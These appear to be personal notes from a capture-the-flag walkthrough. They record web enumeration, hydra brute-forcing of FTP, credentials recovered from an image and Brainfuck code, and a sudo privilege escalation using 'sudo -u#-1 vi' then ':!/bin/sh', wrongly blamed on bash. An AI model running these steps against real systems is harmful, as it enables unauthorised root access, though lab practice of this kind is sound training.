21  
2  
80
 
gobuster  
/assets  
style.css - /sup3r_s3cr3t_fl4g.php  
turn off javascript in firefox; about:config, javascript.enabled turn off; reload page  
listen to embedded vid, hear hint at 56 sec, flag not hear, use burp  
open burp, reload secret flag page, see intermediary and then hidden directory, go to hidden dir, download pic, **strings** on pic, get ftp user and pass, hydra ftp pass, login ftp, more file, decode brainfuck code, ssh with creds,  
Brainfuck:  
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-  
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+  
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+  
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<  
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+  
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---  
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++  
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+  
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++  
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++  
<]>+. <+++[ ->--- <]>-- ---.- ----. <
   

User: eli  
Password: DSpDiM1wAEwid
 
at Login:  
Message from Root to Gwendoline:  
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
 
find / -name "s3cr3t" 2>/dev/null  
/usr/games/s3cr3t  
Your password is awful, Gwendoline.  
It should be at least 60 characters long! Not just MniVCQVhQHUNI  
Honestly!  
Yours sincerely  
-Root
 
(ALL, !root) NOPASSWD: /usr/bin/vi [can run this as sude with any account EXCEPT root]  
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt  
^^vuln in this version of bash that lets you set user id as -1 which bash reverts back to 0 (root) and bypasses restrictions  
:!/bin/sh  
root.txt
 
LESSONS LEARNED:  
turn off javascript in browser  
hidden dir in request header in burp  
strings on image  
brainfuck